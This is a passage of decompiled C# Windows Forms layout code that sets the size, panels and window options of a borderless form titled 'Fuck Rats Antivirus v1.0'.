		((Form)this).set_ClientSize(new Size(1393, 546));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)Panel3);
		((Control)this).get_Controls().Add((Control)(object)Panel2);
		((Control)this).get_Controls().Add((Control)(object)Panel1);
		((Control)this).set_Cursor(Cursors.get_Default());
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Fuck Rats Antivirus v1.0");
		((Control)Panel1).ResumeLayout(false);
		((Control)Panel1).PerformLayout();
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)Panel2).ResumeLayout(false);
		((Control)Panel3).ResumeLayout(false);
		((Control)Panel4).ResumeLayout(false);
		((Control)Panel4).PerformLayout();
		((Control)this).ResumeLayout(false);
	}
}
